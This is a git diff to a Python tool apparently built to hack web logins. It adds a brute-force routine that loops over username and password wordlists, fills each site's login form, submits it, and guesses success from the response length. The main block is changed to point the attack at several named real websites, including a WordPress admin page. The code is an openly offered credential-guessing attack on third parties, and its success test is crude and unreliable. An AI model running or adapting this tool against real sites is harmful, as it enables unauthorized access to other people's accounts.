@@ -9,6 +9,8 @@ from helpers.colors import bcolors
 from tqdm import tqdm
 from bs4 import BeautifulSoup
 import urllib.request
+import requests
+from loginform import fill_login_form
 
 
 class Loginer:
@@ -20,6 +22,8 @@ class Loginer:
 		self.url = configer.url
 		self.adminpages = configer.adminpages 
 		self.filtered_pages = []
+		self.passwords = open('assets/passwords.txt').readlines()
+		self.users = open('assets/users.txt').readlines()
 		# TODO
 
 	def start_hack(self):
@@ -38,14 +42,13 @@ class Loginer:
 	def get_raw_html(self, url):
 		"""Return HTML page from url"""
 		try:
-			req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-			response = urllib.request.urlopen(req)
-			return str(response.read())
+			res = requests.get(url)
+			print(res.text)
 		except:
 			return None
 
 	def has_captcha(self, html):
-		if "captcha" in html:
+		if "captcha" in html.lower() or "recaptcha" in html.lower():
 			return True
 		else:
 			return False
@@ -88,8 +91,63 @@ class Loginer:
 				print(bcolors.FAIL + f"can't parse HTML from: {page}")
 		return login_pages
 
+	def bruteforce_url(self, url):
+		# get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
+
+		""""""
+		# url = "http://leafus.com.ua/wp-login.php"
+		# print(f"Connecting to: {url}......\n")
+		for user in self.users:
+			average = 0
+			for password in self.passwords:
+				# Return login, password and other input.names + target url + method
+				r = requests.get(url)
+
+				try:
+					fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
+				except:
+					print("Can't fill form, skipping page")
+					return
+
+				print(f"trying {user}: {password}")
+				payload = dict(fillings[:-2][0])
+				post_url = fillings[-2:-1][0]
+				method = fillings[-1:][0]
+
+				if method == "POST":
+					with requests.Session() as s:
+						# get cookie for successful POST request
+						res = requests.get(url)
+						cookies = dict(res.cookies)
+						p = s.post(post_url, data=payload, cookies=cookies)
+
+						###############################
+						if not average:
+							average = len(p.text)
+						elif abs(average - len(p.text)) <= 50:
+							print("login successful!")
+						###############################
+
+				elif method == "GET":
+					with requests.Session() as s:
+						res = requests.get(post_url, params=payload)
+						###############################
+						if not average:
+							average = len(res.text)
+						elif abs(average - len(res.text)) <= 50:
+							print(bcolors.CYAN + "login successful!")
+						###############################
+
+				else:
+					# super edge case
+					print('No method found in form, skipping page')
+					return
+
+
 	def bruteforce_attack(self, page_urls):
-		pass
+		for page in page_urls:
+			self.bruteforce_url(page)
+
 
 	def vocabulary_attack(self, page_urls):
 		pass
@@ -108,4 +166,5 @@ if __name__ == "__main__":
 			 "https://stackoverflow.com/", "https://inmac.org/login/"
 			 ]
 
-	log.filter_pages(pages)
+	# log.filter_pages(pages)
+	log.bruteforce_attack(['https://id.bigmir.net/', 'http://leafus.com.ua/wp-admin', 'https://www.ukr.net/'])
